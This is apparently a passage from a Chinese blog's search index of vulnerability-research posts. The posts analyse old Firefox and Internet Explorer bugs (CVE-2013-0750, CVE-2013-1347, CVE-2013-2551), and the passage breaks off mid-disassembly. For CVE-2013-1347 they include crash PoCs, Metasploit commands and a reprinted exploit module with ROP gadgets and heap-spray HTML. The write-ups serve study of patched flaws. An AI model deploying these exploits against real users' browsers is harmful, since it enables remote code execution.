DocumentMicrosoft Vulnerability Research Advisory MSVR13-002Github - CVE-2012-3569NVD - CVE-2012-3569CVE - CVE-2012-3569漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2013-0750 漏洞研究","url":"/2024/12/12/Vulnerability%20Investigation/CVE-2013-0750-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"版本号小于 18.0 的 Firefox 中，JavaScript 引擎在解析字符串替换操作时存在整数溢出，导致分配国小的堆内存造成溢出进而导致任意代码执行\n影响范围:\nMozilla Seamonkey 1.0 - 2.14Mozilla Thunderbird 0.1 - 17.0Mozilla Firefox 0.1 - 17.3Suse Linux Enterprise Desktop 10&#x2F;11Suse Linux Enterprise Server 10&#x2F;11Suse Linux Enterprise Software Development KIT 10&#x2F;11Opensuse Opensuse 11.4Opensuse Opensuse 12.2Opensuse Opensuse 12.1Redhat Enterprise Linux Server 5.0&#x2F;6.0Redhat Enterprise Linux Workstation 5.0&#x2F;6.0Redhat Enterprise Linux Desktop 5.0&#x2F;6.0Redhat Enterprise Linux EUS 5.9&#x2F;6.3Canonical Ubuntu Linux 11.10Canonical Ubuntu Linux 12.10Canonical Ubuntu Linux 12.04Canonical Ubuntu Linux 10.04\n\n\n漏洞分析Firefox 是开源的，可直接通过源码静态分析漏洞成因。以下分析以 Firefox 17.0 为例\n调试运行源码编译并开启 enable-debug 选项的 Firefox 并打开样本后程序触发 Access Violation 异常而中断，由于有源码故通过栈回溯可发现函数调用链为 ReplaceRegExpCallback -&gt; DoReplace -&gt; Vector，可定位到 Crash Point 位于 mozilla-release/js/src/jsstr.cpp 的 2067 行，相关代码如下\n/* * Precondition: |rdata.sb| already has necessary growth space reserved (as * derived from FindReplaceLength). */static voidDoReplace(JSContext *cx, RegExpStatics *res, ReplaceData &amp;rdata)&#123;    JSLinearString *repstr = rdata.repstr;    const jschar *cp;    const jschar *bp = cp = repstr-&gt;chars();    const jschar *dp = rdata.dollar;    const jschar *ep = rdata.dollarEnd;    for (; dp; dp = js_strchr_limit(dp, &#x27;$&#x27;, ep)) &#123;        /* Move one of the constant portions of the replacement value. */        size_t len = dp - cp;        rdata.sb.infallibleAppend(cp, len);        cp = dp;        JSSubString sub;        size_t skip;        if (InterpretDollar(cx, res, dp, ep, rdata, &amp;sub, &amp;skip)) &#123;            len = sub.length;            rdata.sb.infallibleAppend(sub.chars, len); //！ Crash Point            cp += skip;            dp += skip;        &#125; else &#123;            dp++;        &#125;    &#125;    rdata.sb.infallibleAppend(cp, repstr-&gt;length() - (cp - bp));&#125;static boolReplaceRegExpCallback(JSContext *cx, RegExpStatics *res, size_t count, void *p)&#123;    ReplaceData &amp;rdata = *static_cast&lt;ReplaceData *&gt;(p);    rdata.calledBack = true;    size_t leftoff = rdata.leftIndex;    size_t leftlen = res-&gt;matchStart() - leftoff;    rdata.leftIndex = res-&gt;matchLimit();    size_t replen = 0;  /* silence &#x27;unused&#x27; warning */    if (!FindReplaceLength(cx, res, rdata, &amp;replen))        return false;    size_t growth = leftlen + replen;    if (!rdata.sb.reserve(rdata.sb.length() + growth))        return false;    JSLinearString &amp;str = rdata.str-&gt;asLinear();  /* flattened for regexp */    const jschar *left = str.chars() + leftoff;    rdata.sb.infallibleAppend(left, leftlen); /* skipped-over portion of the search value */    DoReplace(cx, res, rdata);    return true;&#125;\n\nCrash Point 处为 rdata.sb 的 infallibleAppend 方法调用，DoReplace 函数内未发现 rdata.sb 存在问题操作，污点分析到 DoReplace 的主调函数 ReplaceRegExpCallback，发现可疑操作 rdata.sb.reserve(rdata.sb.length() + growth)。在 ReplaceRegExpCallback 下断点进行动态分析发现执行到 rdata.sb.reserve(rdata.sb.length() + growth) 时 growth 为 0，很像整数溢出后的结果。对 growth 进行污点分析，溯源到 FindReplaceLength 函数，其相关代码如下\nstatic boolFindReplaceLength(JSContext *cx, RegExpStatics *res, ReplaceData &amp;rdata, size_t *sizep)&#123;    ...    JSString *repstr = rdata.repstr;    size_t replen = repstr-&gt;length();    for (const jschar *dp = rdata.dollar, *ep = rdata.dollarEnd; dp;         dp = js_strchr_limit(dp, &#x27;$&#x27;, ep)) &#123;        JSSubString sub;        size_t skip;        if (InterpretDollar(cx, res, dp, ep, rdata, &amp;sub, &amp;skip)) &#123;            replen += sub.length - skip;            dp += skip;        &#125; else &#123;            dp++;        &#125;    &#125;    *sizep = replen;    return true;&#125;\n\n注意到可疑操作 replen += sub.length - skip;，在该处下条件断点进行动态分析。发现 replen 在循环中每次递增 0xFFFFE，在循环结束后溢出为 0。ReplaceRegExpCallback 中的 growth 变量因此变小，使得 rdata.sb 的 reserve 方法为字符串替换分配的堆块过小，并在 DoReplace 函数内进行字符串替换时因预留空间不足发生堆溢出，程序崩溃\n漏洞利用该漏洞尚未发现通用的漏洞利用方式，令人感慨\nExploit 分析POC 来自于 Bugzilla\n&lt;html&gt;    &lt;script type=&quot;text/javascript&quot;&gt;         function puff(x, n)&#123;            while(x.length&lt;n) x+=x;            x = x.substring(0, n);            return x;        &#125;        var x = &quot;1&quot;;        var rep = &quot;$1&quot;;         x = puff(x, 1&lt;&lt;20);        rep = puff(rep, 1&lt;&lt;16);        y = x.replace(/(.+)/g, rep);        alert(y.length);     &lt;/script&gt;&lt;/html&gt;\n\npuff 函数会将字符串自我凭借到指定长度，POC 通过该函数创建了长度为 2^20 的字符串 x 和长度为 2^16 的字符串 rep 且 rep 内包含了大量与 x 相似的字串，随后通过正则表达式使用 replace 方法对字符串进行替换。由于字符串的长度惊人，故其得以触发上述整数溢出漏洞\n漏洞修复Patch 后 replen 变量类型从 size_t 变成了 CheckedInt&lt;uint32_t&gt;，该类定义在 CheckedInt.h 头文件中，提供了检测整数值是否在有效范围内的 isValid 方法。同时 FindReplaceLength 函数将在循环处理 replen 时对其大小进行判断确保 replen 为正整数递增，循环结束后会再调用 isValid 方法判断 replen 是否溢出，是则会报告溢出并返回失败\nReferenceNVD - CVE-2013-0750CVE - CVE-2013-0750Github - CVE-2013-0750Bugzilla - String Replacement Heap Corruption Remote Code Execution Vulnerability (ZDI-CAN-1473)漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2013-1347 漏洞研究","url":"/2025/03/15/Vulnerability%20Investigation/CVE-2013-1347%20%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"2013 年 5 月 1 日美国劳工部遭受到「水坑」型 APT 攻击，该攻击的主要利用漏洞即为 CVE-2013-1347。美国劳工部网站因被 APT 攻击挂马而导致每个访问该网站的受害者在本地加载 mshtml.dll 和 jscript.dll 两个动态链接库对网页内容进行解析时触发恶意脚本\n影响范围：\nMicrosoft IE 8 running onMicrosoft Windows Server 2003 SP1&#x2F;SP2Microsoft Windows Vista SP2Microsoft Windows XP SP2&#x2F;SP3\n漏洞分析开启 hpa 后调试运行 IE 8 并打开 PoC，选择允许阻止的内容后因 ecx 指向非法地址触发 Access Violation 异常而崩溃，查看 ecx 指向的非法地址所属堆块信息发现该堆块已被 free。栈回溯查看崩溃时栈顶返回地址前的指令，发现为虚函数调用指令。调试这边只能先开摆了从 PoC 入手。\n\n查看堆块信息时会发现它曾被 CGenericElement 对象的析构方法释放过，但这一漏洞的成因与该对象没什么关系，哪怕 CVE-2013-1347 被习惯称作 CGenericElement UAF 漏洞\n\n&lt;!doctype html&gt; &lt;!-- required --&gt;&lt;HTML&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;ttttt:whatever id=&quot;myanim&quot;/&gt;&lt;!-- required format --&gt;&lt;script&gt;    f0=document.createElement(&#x27;span&#x27;);    document.body.appendChild(f0);    f1=document.createElement(&#x27;span&#x27;);    document.body.appendChild(f1);    f2=document.createElement(&#x27;span&#x27;);    document.body.appendChild(f2);    document.body.contentEditable=&quot;true&quot;;    f2.appendChild(document.createElement(&#x27;datalist&#x27;)); //has to be a data list    f1.appendChild(document.createElement(&#x27;table&#x27;));    //has to be a table    try&#123;            f0.offsetParent=null;                       //required    &#125;catch(e)&#123;  &#125;    f2.innerHTML=&quot;&quot;;                                    //required    f0.appendChild(document.createElement(&#x27;hr&#x27;));       //required    f1.innerHTML=&quot;&quot;;                                    //required    CollectGarbage(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n还有一份最简版本的 PoC 为\n&lt;!doctype html&gt;&lt;HTML&gt;&lt;head&gt;&lt;script&gt;function helloWorld() &#123;    f0 = document.createElement(&#x27;span&#x27;);    document.body.appendChild(f0);    f1 = document.createElement(&#x27;span&#x27;);    document.body.appendChild(f1);    f2 = document.createElement(&#x27;span&#x27;);    document.body.appendChild(f2);    document.body.contentEditable=&quot;true&quot;;    Math.atan2(0xbadc0de, &quot;before datalist&quot;)    f2.appendChild(document.createElement(&#x27;datalist&#x27;));    f1.appendChild(document.createElement(&#x27;span&#x27;));    f1.appendChild(document.createElement(&#x27;table&#x27;));    try      &#123; f0.offsetParent=null;&#125;    catch(e) &#123; &#125;    f2.innerHTML = &quot;&quot;;    f1.innerHTML = &quot;&quot;;    f0.appendChild(document.createElement(&#x27;hr&#x27;));    CollectGarbage();&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;eval(helloWorld());&quot;&gt;&lt;/body&gt;&lt;/html&gt;\n\n注意到 PoC 先是创建并渲染了 3 棵树，随后为两棵树添加了两个不同元素类型的子节点，并使添加了内联元素子节点的那棵树的 offsetParent 属性为 null。紧接着 PoC 删除了被添加子节点的树并为剩下的第三棵树添加了 hr 标签子节点，然后显式地进行了垃圾回收\n在理解了 PoC 做了什么之后，就可以去尝试逆向 IE 引擎的 JS 解释器，查找 mshtml.dll 中与 createElement 有关的符号并查阅手册后发现 CDocument::createElement 函数通过调用 CDocument::CreateElementHelper 函数进行相关处理，CDocument::CreateElementHelper 函数又会调用 CMarkup::CreateElement 函数处理，CMarkup::CreateElement 函数则调用 CreateElement 函数处理，CreateElement 函数再根据创建对象调用对应对象的 CreateElement 函数进行创建，例如创建 span 对象将会调用 CSpanElement::CreateElement 函数进行创建，而 PoC 也的确创建的 span 对象，因此继续跟进到 CSpanElement::CreateElement 函数，该函数将通过 HeapAlloc 函数申请大小为 0x28 的堆块然后调用 CElement::CElement 函数。CElement::CElement 函数将会把创建的对象放进此前申请的堆块中\n\n大部分元素创建时虽然调用的函数链不同，分配的内存堆块大小也不同，例如 span 元素会分配 0x28 而 CGenericElement 元素会分配 0x38，但都会经过 CElement::CElement 函数,\n\n即 span 元素被创建时，函数调用链如下所示\nCDocument::createElement-&gt; CDocument::createElementHelper-&gt; CMarkup::CreateElement-&gt; CreateElement-&gt; CSpanElement::CreateElement-&gt; CElement::CElement\n\n\n需要注意的是 f0,f1,f2 要是内联元素，不一定非要是 span，同时 f1 需要添加一个块元素，f2 需要添加一个内联元素\n\n通过类似过程逆向得出 appendChild 操作由以下函数调用链执行\nCElement::appendChild-&gt; CElement::InsertBefore-&gt; CElement::InsertBeforeHelper-&gt; CDoc::InsertElement-&gt; CMarkup::InsertElementInternal-&gt; CTreeNode::CTreeNode\n\n这样我们便能够通过在对应函数位置下条件断点的方式，即在 CElement::CElement 和 CTreeNode::CTreeNode 函数处下断点并打印寄存器的值，得到 PoC 中所有创建的对象的地址。结合程序触发 Access Violation 异常而崩溃时的寄存器值最终能够得出存在漏洞的对象是此处创建的\nf2.appendChild(document.createElement(&#x27;datalist&#x27;));\n\n故被 UAF 的内存堆块实际上是 datalist 元素的 CTreeNode 对象。再接着之前的方式逆向之后的 JS 语句，发现对 f0.offsetParent 的置空操作由 CElement::get_offsetParent 函数执行，它会调用 CElement:GetOffsetParentHelper 函数，并对 CTreeNode 中的值进行修改，通过查阅 IE 源码或阅读手册也可以得到 CTreeNode 内各个偏移量处的值对应的字段，但更直接的办法是对被修改的位置下读断点，会发现程序断在 CTreeNode::GetCharFormat 函数处，故被修改的值，更具体地说是 CTreeNode + C 处的值是 CTreeNode 对象的 CharFormat 字段值，查阅手册发现该字段的整数值会影响对象的渲染，若该整数值值小于零则不会重新渲染 HTML 元素\n\nCharFormat 字段值疑似对象的引用计数\n\n但 CTreeNode::GetCharFormat 函数会令其值大于零而被再次渲染，而再次渲染的结果则是 CTreeNode 对象不会被释放但其内部却依然存有指向被释放的 datalist 结点，即一个 CGenericElement 对象的指针，因而导致了 UAF 漏洞并在后续 f0.appendChild(document.createElement(&#39;hr&#39;)); 语句执行后进行的 CTreeNode 的寻址流程和显式调用垃圾回收后的再次渲染流程中将其触发\n\n最后的漏洞成因解释有些笼统，原因是我感觉分析到这一步，把剩余部分当作黑盒就差不多够了，要完全解释这个漏洞的成因会有些复杂。简略地说就是因为 f2.offsetParent = null 这个语句导致了页面的重新渲染，进而导致了 CTreeNode 对象被 SLayoutRun 引用。在这一过程中，IE 会根据页面标签的性质做不同类型的操作。进行的操作可能和块与内联标签的具体处理逻辑有关，即只有紧挨者的标签（offsetParent）是块元素时，内联元素才会通过 mshtml!CCssDocumentLayout::GetPage 中的 if 判断进入到 CLayoutBlock::BuildBlock 函数中被 SLayoutRun 引用。同时也只有 f0 在添加 hr 标签子节点时 CGenericElement 的 CTreeNode 和 CElement 能够被意外地没被释放并在后续渲染 hr 标签表示的水平分割线时对 CTreeNode 进行寻址和引用。看雪精华帖的 LarryS 师傅对它进行了更细致的分析，可参阅看雪论坛精华帖进行更进一步的了解\n\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2013-1347\n\n搜索结果\nMatching Modules================   #  Name                                            Disclosure Date  Rank  Check  Description   -  ----                                            ---------------  ----  -----  -----------   0  exploit/windows/browser/ie_cgenericelement_uaf  2013-05-03       good  No     MS13-038 Microsoft Internet Explorer CGenericElement Object Use-After-Free Vulnerability   1    \\_ target: Automatic                          .                .     .      .   2    \\_ target: IE 8 on Windows XP SP3             .                .     .      .   3    \\_ target: IE 8 on Windows Vista              .                .     .      .   4    \\_ target: IE 8 on Windows Server 2003        .                .     .      .   5    \\_ target: IE 8 on Windows 7                  .                .     .      .Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/browser/ie_cgenericelement_uafAfter interacting with a module you can manually set a TARGET with set TARGET &#x27;IE 8 on Windows 7&#x27;\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/browser/ie_cgenericelement_uafmsf6 exploit(windows/browser/ie_cgenericelement_uaf) &gt; info\n\n模块详情信息\n       Name: MS13-038 Microsoft Internet Explorer CGenericElement Object Use-After-Free Vulnerability     Module: exploit/windows/browser/ie_cgenericelement_uaf   Platform: Windows       Arch:  Privileged: No    License: Metasploit Framework License (BSD)       Rank: Good  Disclosed: 2013-05-03Provided by:  Unknown  EMH  juan vazquez &lt;juan.vazquez@metasploit.com&gt;  sinn3r &lt;sinn3r@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   Automatic      1   IE 8 on Windows XP SP3      2   IE 8 on Windows Vista      3   IE 8 on Windows Server 2003      4   IE 8 on Windows 7Check supported:  NoBasic options:  Name       Current Setting  Required  Description  ----       ---------------  --------  -----------  OBFUSCATE  false            no        Enable JavaScript obfuscation  SRVHOST    *******          yes       The local host or network interface to listen on. This must be an address on the local machi                                        ne or ******* to listen on all addresses.  SRVPORT    8080             yes       The local port to listen on.  SSL        false            no        Negotiate SSL for incoming connections  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)  URIPATH                     no        The URI to use for this exploit (default is random)Payload information:  Space: 1024  Avoid: 1 charactersDescription:  This module exploits a vulnerability found in Microsoft Internet Explorer. A  use-after-free condition occurs when a CGenericElement object is freed, but a  reference is kept on the Document and used again during rendering, an invalid  memory that&#x27;s controllable is used, and allows arbitrary code execution under the  context of the user.    Please note: This vulnerability has been exploited in the wild on 2013 May, in  the compromise of the Department of Labor (DoL) Website.References:  https://nvd.nist.gov/vuln/detail/CVE-2013-1347  OSVDB (92993)  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2013/MS13-038  https://www.kb.cert.org/vuls/id/237655  http://blogs.technet.com/b/msrc/archive/2013/05/03/microsoft-releases-security-advisory-2847140.aspx  http://r-7.co/IE8-DOLView the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/browser/ie_cgenericelement_uaf) &gt; set payload windows/execmsf6 exploit(windows/browser/ie_cgenericelement_uaf) &gt; set CMD calc.exemsf6 exploit(windows/browser/ie_cgenericelement_uaf) &gt; exploit\n\n随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其恶意 HTML 文件以触发漏洞\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploit/windows/browser/ie_cgenericelement_uaf.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = GoodRanking  include Msf::Exploit::Remote::HttpServer::HTML  include Msf::Exploit::RopDb  include Msf::Exploit::Remote::BrowserAutopwn  autopwn_info(&#123;    :ua_name    =&gt; HttpClients::IE,    :ua_minver  =&gt; &quot;8.0&quot;,    :ua_maxver  =&gt; &quot;8.0&quot;,    :javascript =&gt; true,    :os_name    =&gt; OperatingSystems::Match::WINDOWS,    :rank       =&gt; GoodRanking  &#125;)  def initialize(info=&#123;&#125;)    super(update_info(info,      &#x27;Name&#x27;           =&gt; &quot;MS13-038 Microsoft Internet Explorer CGenericElement Object Use-After-Free Vulnerability&quot;,      &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,      &#x27;License&#x27;        =&gt; MSF_LICENSE,      &#x27;Author&#x27;         =&gt; [...],      &#x27;References&#x27;     =&gt; [...],      &#x27;Payload&#x27;        =&gt;        &#123;          &#x27;BadChars&#x27;       =&gt; &quot;\\x00&quot;,          &#x27;Space&#x27;          =&gt; 1024,          &#x27;DisableNops&#x27;    =&gt; true        &#125;,      &#x27;DefaultOptions&#x27;  =&gt; &#123;...&#125;,      &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,      &#x27;Targets&#x27;        =&gt; [...],      &#x27;Privileged&#x27;     =&gt; false,      &#x27;DisclosureDate&#x27; =&gt; &#x27;2013-05-03&#x27;,      &#x27;DefaultTarget&#x27;  =&gt; 0))    register_options([...])  end  def get_target(agent)    return target if target.name != &#x27;Automatic&#x27;    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || &#x27;&#x27;    ie = agent.scan(/MSIE (\\d)/).flatten[0] || &#x27;&#x27;    ie_name = &quot;IE #&#123;ie&#125;&quot;    case nt    when &#x27;5.1&#x27;      os_name = &#x27;Windows XP SP3&#x27;    when &#x27;5.2&#x27;      os_name = &#x27;Windows Server 2003&#x27;    when &#x27;6.0&#x27;      os_name = &#x27;Windows Vista&#x27;    when &#x27;6.1&#x27;      os_name = &#x27;Windows 7&#x27;    else      # OS not supported      return nil    end    targets.each do |t|      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))        print_status(&quot;Target selected as: #&#123;t.name&#125;&quot;)        return t      end    end    return nil  end  def get_payload(t, cli)    rop_payload = &#x27;&#x27;    # Extra junk in the end to make sure post code execution is stable.    p = payload.encoded    case t[&#x27;Rop&#x27;]    when :msvcrt      align = &quot;\\x81\\xc4\\x54\\xf2\\xff\\xff&quot; # Stack adjustment # add esp, -3500      rop_payload = &#x27;&#x27;      if t.name == &#x27;IE 8 on Windows XP SP3&#x27;        rop_payload = generate_rop_payload(&#x27;msvcrt&#x27;, align+p, &#123;&#x27;target&#x27;=&gt;&#x27;xp&#x27;&#125;)      elsif t.name == &#x27;IE 8 on Windows Server 2003&#x27;        rop_payload = generate_rop_payload(&#x27;msvcrt&#x27;, align+p, &#123;&#x27;target&#x27;=&gt;&#x27;2003&#x27;&#125;)      end    else      code  = &quot;\\x81\\xEC\\xF0\\xD8\\xFF\\xFF&quot; # sub esp, -10000      code &lt;&lt; p      code &lt;&lt; rand_text_alpha(12000)      rop_payload = generate_rop_payload(&#x27;java&#x27;, code)    end    return rop_payload  end  def load_exploit_html(my_target, cli)    case my_target[&#x27;Rop&#x27;]    when :msvcrt      case my_target.name      when &#x27;IE 8 on Windows XP SP3&#x27;        align_esp = Rex::Text.to_unescape([0x77c4d801].pack(&quot;V*&quot;)) # ADD ESP, 2C; RET        xchg_esp  = Rex::Text.to_unescape([0x77c15ed5].pack(&quot;V*&quot;)) # XCHG EAX, ESP, RET      when &#x27;IE 8 on Windows Server 2003&#x27;        align_esp = Rex::Text.to_unescape([0x77bde7f6].pack(&quot;V*&quot;))        xchg_esp  = Rex::Text.to_unescape([0x77bcba5e].pack(&quot;V*&quot;))      end    else      align_esp = Rex::Text.to_unescape([0x7C3445F8].pack(&quot;V*&quot;))      xchg_esp  = Rex::Text.to_unescape([0x7C348B05].pack(&quot;V*&quot;))    end    padding    = Rex::Text.to_unescape(Rex::Text.rand_text_alpha(4))    js_payload = Rex::Text.to_unescape(get_payload(my_target, cli))    html = %Q|    &lt;!doctype html&gt;    &lt;HTML XMLNS:t =&quot;urn:schemas-microsoft-com:time&quot;&gt;    &lt;head&gt;    &lt;meta&gt;      &lt;?IMPORT namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;    &lt;/meta&gt;    &lt;script&gt;    #&#123;js_mstime_malloc&#125;    function helloWorld()    &#123;      sparkle = unescape(&quot;ABCD&quot;);      for (i=0; i &lt; 2; i++) &#123;        sparkle += unescape(&quot;ABCD&quot;);      &#125;      sparkle += unescape(&quot;AB&quot;);      sparkle += unescape(&quot;#&#123;js_payload&#125;&quot;);      magenta = unescape(&quot;#&#123;align_esp&#125;&quot;);      for (i=0; i &lt; 0x70/4; i++) &#123;        if (i == 0x70/4-1) &#123; magenta += unescape(&quot;#&#123;xchg_esp&#125;&quot;); &#125;        else               &#123; magenta += unescape(&quot;#&#123;align_esp&#125;&quot;); &#125;      &#125;      magenta += sparkle;      document.body.contentEditable=&quot;true&quot;;      f0 = document.createElement(&#x27;span&#x27;);      f1 = document.createElement(&#x27;span&#x27;);      f2 = document.createElement(&#x27;span&#x27;);      document.body.appendChild(f0);      document.body.appendChild(f1);      document.body.appendChild(f2);      for (i=0; i &lt; 20; i++) &#123; document.createElement(&quot;img&quot;); &#125;      f2.appendChild(document.createElement(&#x27;datalist&#x27;));      f1.appendChild(document.createElement(&#x27;span&#x27;));      CollectGarbage();      f1.appendChild(document.createElement(&#x27;table&#x27;));      try      &#123; f0.offsetParent=null;&#125;      catch(e) &#123; &#125;      f2.innerHTML = &quot;&quot;;      f1.innerHTML = &quot;&quot;;      f0.appendChild(document.createElement(&#x27;hr&#x27;));      mstime_malloc(&#123;shellcode:magenta, heapBlockSize:0x38, objId:&quot;myanim&quot;&#125;);    &#125;    &lt;/script&gt;    &lt;/head&gt;    &lt;body onload=&quot;eval(helloWorld());&quot;&gt;    &lt;t:ANIMATECOLOR id=&quot;myanim&quot;/&gt;    &lt;/body&gt;    &lt;/html&gt;    |    return html  end  def on_request_uri(cli, request)    agent = request.headers[&#x27;User-Agent&#x27;]    uri   = request.uri    print_status(&quot;Requesting: #&#123;uri&#125;&quot;)    my_target = get_target(agent)    if my_target.nil?      print_error(&quot;Browser not supported, sending 404: #&#123;agent&#125;&quot;)      send_not_found(cli)      return    end    html = load_exploit_html(my_target, cli)    html = html.gsub(/^ &#123;4&#125;/, &#x27;&#x27;)    print_status(&quot;Sending HTML...&quot;)    send_response(cli, html, &#123;&#x27;Content-Type&#x27;=&gt;&#x27;text/html&#x27;&#125;)  endend\n\nIE8 中存在一个叫做 t:ANIMATECOLOR 的标签，其标签值为一个用分号分隔的字符串。标签对象的每个元素都时一个指针，指向分号分隔出的字符串，因此其大小取决于分号的个数，即我们可以任意控制该对象的大小和其作为指针的元素指向的内容。由漏洞分析得知 UAF 对象的大小为 0x4c，故 exp 创建了包含 0x4c &#x2F; 4 &#x3D; 13 个分号的字符串，且第一个分号前的字符串被用于覆盖虚表指针。随后即可劫持程序执行流到 ROP 链上再跳转到 shellcode 上是新鲜任意代码执行\n漏洞修复相应渲染逻辑被修改后漏洞修复\nReferenceMicrosoft Security Bulletin MS13-038 - CriticalGithub - CVE-2013-1347NVD - CVE-2013-1347CVE - CVE-2013-1347漏洞战争\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2013-2551 漏洞研究","url":"/2024/12/24/Vulnerability%20Investigation/CVE-2013-2551-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"法国安全团队 VUPEN 在 Pwn2Own 2013 大赛上利用 CVE-2013-2551 攻破了 Windows 8 的 IE 10。漏洞出现在 IE 中负责解析 VML 的 VGX.dll 模块,其中的 COALineDashStyleArray::put_length 函数在处理 &lt;v:stroke&gt; 标签的 dashstyle.array.length 属性时未对输入进行有效验证导致整数溢出,进而可实现任意读写与 RCE\n影响范围:\nIE 7 - &gt; IE 10\nRunning on\nMicrosoft Windows Server 2003&#x2F;2008&#x2F;2012Microsoft Windows XP SP2&#x2F;SP3Microsoft Windows Vista SP2Microsoft Windows 7 SP1Microsoft Windows 8\n\n\n漏洞分析开启 hpa 调试运行 IE 并打开样本,程序触发 Access Violation 异常而崩溃,异常触发原因为内存复制时源地址访问越界。通过栈回溯发现 Crash Point 位于 msvcrt!memcpy 函数内,其主调函数为 vgx!ORG::Get。使用 IDA 打开 VGX.dll 并定位到目标函数,其反汇编代码为\n.text:198ECF82                               ; =============== S U B R O U T I N E =======================================.text:198ECF82.text:198ECF82                               ; Attributes: bp-based frame.text:198ECF82.text:198ECF82                               ; void __stdcall ORG::Get(ORG *__hidden this, void *, int).text:198ECF82                               ?Get@ORG@@UAGXPAXH@Z proc near          ; DATA XREF: .text:198D7274↑o.text:198ECF82.text:198ECF82                               this= dword ptr  8.text:198ECF82                               arg_4= dword ptr  0Ch.text:198ECF82                               arg_8= dword ptr  10h.text:198ECF82.text:198ECF82 8B FF                         mov     edi, edi.text:198ECF84 55                            push    ebp.text:198ECF85 8B EC                         mov     ebp, esp.text:198ECF87 83 7D 0C 00                   cmp     [ebp+arg_4], 0.text:198ECF8B 74 1F                         jz      short loc_198ECFAC.text:198ECF8B.text:198ECF8D 8B 4D 08                      mov     ecx, [ebp+this].text:198ECF90 8B 41 08                      mov     eax, [ecx+8].text:198ECF93 25 FF FF 00 00                and     eax, 0FFFFh.text:198ECF98 50                            push    eax                             ; Size.text:198ECF99 0F AF 45 10                   imul    eax, [ebp+arg_8].text:198ECF9D 03 41 10                      add     eax, [ecx+10h].text:198ECFA0 50                            push    eax                             ; Src.text:198ECFA1 FF 75 0C                      push    [ebp+arg_4]                     ; void *.text:198ECFA4 E8 00 A5 FF FF                call    _memcpy.text:198ECFA4.text:198ECFA9 83 C4 0C                      add     esp, 0Ch.text:198ECFA9.text:198ECFAC.text:198ECFAC                               loc_198ECFAC:                           ; CODE XREF: ORG::Get(void *,int)+9↑j.text:198ECFAC 5D                            pop     ebp.text:198ECFAD C2 0C 00                      retn    0Ch.text:198ECFAD.text:198ECFAD                               ?Get@ORG@@UAGXPAXH@Z endp.text:198ECFAD.text:198ECFAD                               ; ---------------------------------------------------------------------------\n\n其反编译代码为\nvoid __stdcall ORG::Get(ORG *this, void *a2, int a3)&#123;  if ( a2 )    memcpy(      a2,      (const void *)(*((_DWORD *)this + 4) + a3 * (unsigned __int16)*((_DWORD *)this + 2)),      (unsigned __int16)*((_DWORD *)this + 2));&#125;\n\n在该函数处下断点,查看崩溃前 memcpy 的参数,其中内存复制的源地址指向了堆之外,与异常触发原因吻合。对异常地址进行污点分析,发现其首先来自于函数参数,栈回溯得到 ORG::Get 的主调函数为 COALineDashStyleArray::get_item,其反汇编代码为\n.text:1993D983                               ; =============== S U B R O U T I N E =======================================.text:1993D983.text:1993D983                               ; Attributes: bp-based frame.text:1993D983.text:1993D983                               ; int __stdcall COALineDashStyleArray::get_item(struct COAProg **this, int, int *).text:1993D983                               ?get_item@COALineDashStyleArray@@UAGJHPAJ@Z proc near.text:1993D983                                                                       ; DATA XREF: .text:19944988↓o.text:1993D983.text:1993D983                               var_14= dword ptr -14h.text:1993D983                               var_4= dword ptr -4.text:1993D983                               this= dword ptr  8.text:1993D983                               arg_4= dword ptr  0Ch.text:1993D983                               arg_8= dword ptr  10h.text:1993D983.text:1993D983 8B FF                         mov     edi, edi.text:1993D985 55                            push    ebp.text:1993D986 8B EC                         mov     ebp, esp.text:1993D988 83 EC 14                      sub     esp, 14h.text:1993D98B 56                            push    esi.text:1993D98C 8B 75 08                      mov     esi, [ebp+this].text:1993D98F 6A 00                         push    0                               ; bool.text:1993D991 FF 76 04                      push    dword ptr [esi+4]               ; struct COAProg *.text:1993D994 8D 4D EC                      lea     ecx, [ebp+var_14]               ; this.text:1993D997 68 3C 22 96 19                push    offset ?s_dispStatic@?$COADispatchImpl@UIVgDashStyleArray@@$1?IID_IVgDashStyleArray@@3U_GUID@@BVCOAShapeProg@@@@1UOADISPSTATIC@@A ; struct OADISPSTATIC *.text:1993D99C E8 A5 4E FE FF                call    ??0COAError@@QAE@AAUOADISPSTATIC@@AAVCOAProg@@_N@Z ; COAError::COAError(OADISPSTATIC &amp;,COAProg &amp;,bool).text:1993D99C.text:1993D9A1 83 7D EC 00                   cmp     [ebp+var_14], 0.text:1993D9A5 7D 12                         jge     short loc_1993D9B9.text:1993D9A5.text:1993D9A7.text:1993D9A7                               loc_1993D9A7:                           ; CODE XREF: COALineDashStyleArray::get_item(int,long *)+94↓j.text:1993D9A7                                                                       ; COALineDashStyleArray::get_item(int,long *)+9D↓j.text:1993D9A7                                                                       ; COALineDashStyleArray::get_item(int,long *)+A6↓j.text:1993D9A7 8B 75 EC                      mov     esi, [ebp+var_14].text:1993D9AA 8D 4D EC                      lea     ecx, [ebp+var_14]               ; this.text:1993D9AD E8 